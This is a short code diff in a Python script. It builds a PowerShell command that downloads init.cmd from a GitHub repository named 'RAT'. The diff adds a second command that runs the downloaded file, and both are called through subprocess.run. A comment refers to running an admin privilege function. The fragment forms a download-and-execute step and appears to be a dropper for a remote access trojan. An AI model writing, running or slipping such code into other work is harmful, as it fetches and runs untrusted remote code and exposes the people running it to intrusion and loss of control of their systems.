@@ -27,8 +27,15 @@ command = [
     "powershell.exe",
     "-Command",
     "Invoke-WebRequest -Uri https://raw.githubusercontent.com/lukeeeeeee335/RAT/main/init.cmd -OutFile init.cmd"
-    ".\\wget.cmd"
 ]
+
+command2 = [
+    "powershell.exe",
+    "-Command",
+    ".\\init.cmd"
+]
+
 subprocess.run(command)
+subprocess.run(command2)
 
 ## run our admin privlige function i.e. wget and init.cmd .\init.cmd
